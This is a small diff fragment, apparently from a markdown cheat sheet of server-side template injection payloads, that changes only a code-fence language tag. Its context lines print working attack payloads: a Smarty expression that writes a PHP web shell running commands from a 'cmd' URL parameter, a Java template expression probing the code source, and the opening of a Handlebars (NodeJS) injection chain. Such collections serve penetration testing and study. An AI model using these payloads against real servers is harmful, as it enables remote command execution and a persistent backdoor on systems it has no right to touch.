@@ -619,7 +619,7 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
 ### `Handlebars(NodeJS)`
-```
+```js
 wrtz{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
